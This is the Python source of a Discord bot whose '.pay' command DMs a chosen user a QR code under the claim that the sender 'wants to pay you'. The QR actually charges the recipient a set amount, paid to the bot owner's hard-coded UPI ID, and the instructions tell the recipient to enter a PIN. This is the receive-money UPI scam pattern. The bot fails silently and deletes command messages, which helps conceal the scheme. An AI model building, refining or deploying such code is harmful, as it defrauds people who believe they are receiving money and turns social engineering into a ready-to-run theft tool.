import discord
from discord.ext import commands
import qrcode
from io import BytesIO
import os
from dotenv import load_dotenv
import urllib.parse
import time

load_dotenv()

# Bot configuration
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='.', intents=intents)

# Your fixed UPI ID
YOUR_UPI_ID = "dreamhelper@upi"
YOUR_NAME = "Dream Helper"  # अपना नाम डालें

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} guilds')
    print(f'Using UPI ID: {YOUR_UPI_ID}')
    await bot.change_presence(activity=discord.Game(name="EXC ON TOP"))

def create_upi_qr(amount, recipient_name):
    """Create UPI QR code with fixed UPI ID and amount"""
    
    # Encode the name for URL
    encoded_name = urllib.parse.quote(YOUR_NAME)
    
    # Create UPI payment URL with fixed amount
    upi_url = f"upi://pay?pa={YOUR_UPI_ID}&pn={encoded_name}&am={amount}&cu=INR"
    
    # Create QR code
    qr = qrcode.QRCode(
        version=1,
        box_size=10,
        border=4,
        error_correction=qrcode.constants.ERROR_CORRECT_H
    )
    
    qr.add_data(upi_url)
    qr.make(fit=True)
    
    # Create QR code image
    img = qr.make_image(fill_color="black", back_color="white")
    
    # Save to bytes
    img_bytes = BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    
    return img_bytes

@bot.command(name='pay')
async def pay(ctx, member: discord.Member = None, amount: int = None):
    """
    Send UPI QR code directly to user's DM
    Usage: .pay @username 100
    """
    
    # Validate inputs
    if member is None:
        return  # बिल्कुल silent, कोई response नहीं
    
    if amount is None:
        return  # बिल्कुल silent, कोई response नहीं
    
    if amount <= 0 or amount > 100000:
        return  # बिल्कुल silent, कोई response नहीं
    
    if member == ctx.author:
        return  # बिल्कुल silent, कोई response नहीं
    
    try:
        # Create UPI QR code with fixed amount
        qr_image = create_upi_qr(amount, str(member))
        
        # Create DM embed
        dm_embed = discord.Embed(
            title="💰 UPI Payment Request",
            description=f"{ctx.author.name} wants to pay you",
            color=discord.Color.green()
        )
        dm_embed.add_field(name="UPI ID", value=f"`{YOUR_UPI_ID}`", inline=True)
        dm_embed.add_field(name="Amount", value=f"**₹{amount}**", inline=True)
        dm_embed.add_field(name="From", value=ctx.author.name, inline=True)
        dm_embed.add_field(
            name="📱 How to Pay", 
            value="1. Scan QR code\n2. Open with any UPI app\n3. Amount is already set\n4. Enter PIN to pay", 
            inline=False
        )
        dm_embed.set_footer(text=f"Fixed Amount: ₹{amount}")
        
        # Send QR in DM to recipient
        file = discord.File(BytesIO(qr_image.getvalue()), filename="payment_qr.png")
        dm_embed.set_image(url="attachment://payment_qr.png")
        
        await member.send(file=file, embed=dm_embed)
        
        # Send confirmation to payer (आपको)
        try:
            confirm_embed = discord.Embed(
                title="✅ Payment Request Sent",
                description=f"QR code sent to {member.name}",
                color=discord.Color.blue()
            )
            confirm_embed.add_field(name="Amount", value=f"₹{amount}", inline=True)
            confirm_embed.add_field(name="Recipient", value=member.name, inline=True)
            await ctx.author.send(embed=confirm_embed)
        except:
            pass  # अगर payer के DM बंद हैं तो ignore
            
    except discord.Forbidden:
        pass  # अगर recipient के DM बंद हैं तो silent ignore
    except Exception as e:
        print(f"Error: {e}")  # सिर्फ console में error log
        pass

@bot.command(name='ping')
async def ping(ctx):
    """
    Check bot's latency and response time
    Usage: .ping
    """
    
    # Start time
    start_time = time.time()
    
    # Send initial message (will be deleted)
    msg = await ctx.send("🏓 Pinging...")
    
    # Calculate latency
    end_time = time.time()
    api_latency = round(bot.latency * 1000)  # Discord API latency in ms
    response_time = round((end_time - start_time) * 1000)  # Response time in ms
    
    # Create embed for DM
    embed = discord.Embed(
        title="🏓 Pong!",
        color=discord.Color.green()
    )
    embed.add_field(name="Discord API Latency", value=f"```{api_latency}ms```", inline=True)
    embed.add_field(name="Response Time", value=f"```{response_time}ms```", inline=True)
    embed.add_field(name="Bot Status", value="```✅ Online```", inline=True)
    embed.add_field(name="UPI ID", value=f"`{YOUR_UPI_ID}`", inline=False)
    embed.set_footer(text=f"Requested by {ctx.author.name}")
    
    # Delete the original message
    await msg.delete()
    
    # Send result to DM
    try:
        await ctx.author.send(embed=embed)
    except:
        # अगर DM नहीं भेज सकते तो चैनल में ही भेजो (लेकिन 5 सेकंड बाद डिलीट कर दो)
        temp_msg = await ctx.send(embed=embed)
        await asyncio.sleep(5)
        await temp_msg.delete()
    
    # Delete the command message
    try:
        await ctx.message.delete()
    except:
        pass

@bot.command(name='ping2')
async def ping_simple(ctx):
    """
    Very simple ping command (just for quick check)
    Usage: .ping2
    """
    
    latency = round(bot.latency * 1000)
    
    try:
        await ctx.author.send(f"🏓 Pong! `{latency}ms`")
    except:
        temp_msg = await ctx.send(f"🏓 Pong! `{latency}ms`")
        await asyncio.sleep(3)
        await temp_msg.delete()
    
    try:
        await ctx.message.delete()
    except:
        pass

@bot.command(name='uptime')
async def uptime(ctx):
    """
    Check bot uptime (needs start time tracking)
    Usage: .uptime
    """
    
    # अगर आप start time track करना चाहते हैं तो बताएं
    embed = discord.Embed(
        title="⏱️ Bot Information",
        color=discord.Color.blue()
    )
    embed.add_field(name="Status", value="✅ Online", inline=True)
    embed.add_field(name="Latency", value=f"`{round(bot.latency * 1000)}ms`", inline=True)
    embed.add_field(name="UPI ID", value=f"`{YOUR_UPI_ID}`", inline=False)
    
    try:
        await ctx.author.send(embed=embed)
    except:
        temp_msg = await ctx.send(embed=embed)
        await asyncio.sleep(5)
        await temp_msg.delete()
    
    try:
        await ctx.message.delete()
    except:
        pass

@bot.command(name='payhelp')
async def pay_help(ctx):
    """Simple help command"""
    embed = discord.Embed(
        title="💰 UPI Payment Bot",
        description=f"Your UPI ID: `{YOUR_UPI_ID}`",
        color=discord.Color.gold()
    )
    
    commands_list = """
    **📤 Payment Commands**
    `.pay @user 100` - Send QR code to user's DM
    
    **🏓 Utility Commands**
    `.ping` - Check bot latency (detailed)
    `.ping2` - Quick ping check
    `.uptime` - Bot status info
    `.payhelp` - Show this help
    """
    
    embed.description = commands_list
    embed.set_footer(text="All commands work silently • Messages are deleted")
    
    # सिर्फ DM में help भेजो
    await ctx.author.send(embed=embed)
    
    # Delete command message
    try:
        await ctx.message.delete()
    except:
        pass

# Add asyncio for sleep function
import asyncio

# Run the bot
if __name__ == "__main__":
    token = os.getenv('DISCORD_BOT_TOKEN')
    if not token:
        print("❌ Error: DISCORD_BOT_TOKEN not found in .env file!")
    else:
        print(f"✅ Bot starting with UPI ID: {YOUR_UPI_ID}")
        print("📱 Commands: .pay, .ping, .ping2, .uptime, .payhelp")
        bot.run(token)

